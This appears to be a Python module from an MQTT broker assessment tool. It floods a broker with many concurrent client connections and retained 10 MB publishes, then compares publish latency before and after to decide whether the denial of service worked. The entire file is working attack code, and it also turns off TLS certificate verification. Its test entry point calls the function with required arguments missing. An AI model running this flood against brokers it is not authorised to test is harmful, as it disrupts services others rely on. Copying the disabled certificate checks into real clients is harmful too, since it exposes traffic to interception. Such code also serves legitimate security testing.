import ssl, time
import paho.mqtt.client as mqtt
from statistics import mean

connected = 0
connection_difference = 0
percentage_increment = 0

def on_connect(client, userdata, flags, rc):
    global connected
    connected +=1
    #client.loop_stop()

def time_publisher(host, port, topic, credentials, tls_cert, client_cert, client_key):
    measures = [] #Contains the latency of QoS 1 (synchronous) publish messages
    
    #Init and connect client (Keepalive=60s)
    client = mqtt.Client(client_id="Time_publisher", clean_session=True)
    
    if (credentials):
        client.username_pw_set(credentials[0], credentials[1])
    if tls_cert != None:
        client.tls_set(tls_cert, client_cert, client_key, cert_reqs=ssl.CERT_NONE, tls_version=ssl.PROTOCOL_TLS, ciphers=None)
        client.tls_insecure_set(True)

    client.connect(host, port, 60)
    client.loop_start()
    
    #Measure upon 100 messages
    for x in range (100):
        time.sleep(.1)
        pre = int(round(time.time() * 1000))
        client.publish(topic,"Message "+str(x+1),1) #QoS 1 messages
        measures.append(int(round(time.time() * 1000)) - pre)
        
    client.loop_stop()
    client.disconnect()
    
    #Return mean of measures
    return mean(measures)
    
# this function is called from the threaded_broker_dos one, which handles the creation of threads
def broker_dos(host, port, credentials, connections, topic, tls_cert, client_cert, client_key):
    global connection_difference
    global percentage_increment
    global connected
    
    print ("DoS client credentials: " + str(credentials))
    
    pre_dos_avg_time = time_publisher(host, port, topic, credentials, tls_cert, client_cert, client_key)
    
    # an array containing all clients
    mqtt_clients = []

    #Attempts to saturate connections
    for x in range(int(connections)):
        
        client = mqtt.Client(client_id="Client_"+str(x), clean_session=True)
        client.on_connect = on_connect
        
        if (credentials):
            client.username_pw_set(credentials[0], credentials[1])
        if tls_cert != None:
            client.tls_set(tls_cert, client_cert, client_key, cert_reqs=ssl.CERT_NONE, tls_version=ssl.PROTOCOL_TLS, ciphers=None)
            client.tls_insecure_set(True)
            
        client.connect_async(host, port, 60)
        client.loop_start()
        mqtt_clients.append(client)

    #Wait for all connection or 30 sectimeout
    try:
        print("DoS timeout (press ctrl+c once to skip):")
        for x in range (30):
            if(int(connections)-connected == 0):
                print("All DoS clients are connected")
                break;
            else:
                print(" " + str(30-x) + "s")
                time.sleep(1)
    except KeyboardInterrupt:
        pass
        
    #10MB Payload
    payload = "0" * 10485000
    
    for client in mqtt_clients:
        client.publish(topic,payload,0,True)

    post_dos_avg_time = time_publisher(host, port, topic, credentials, tls_cert, client_cert, client_key)
    
    connection_difference = (int(connections)-connected)
    
    if(pre_dos_avg_time != 0):
        percentage_increment = ((post_dos_avg_time - pre_dos_avg_time)/pre_dos_avg_time)*100
    
    #If not all clients managed to connect or there is an increment in publish time of more than 10% DoS is succesfull
    if ( connection_difference != 0 or percentage_increment > 10):
        return True;
    else:
        return False;

# used for testing purposes
if __name__ == "__main__":
    host = input("Enter host address:")
    port = input("Enter port number:")
    tls_cert = input("Specify CA certificate (empty if no TLS):")
    client_cert = input("Specify client certificate (empty if no TLS):")
    port = int(port)
    if tls_cert == "":
        tls_cert = None
    if client_cert == "":
        client_cert = None
    print(broker_dos(host, port, connections=50, tls_cert=tls_cert, client_cert=client_cert))
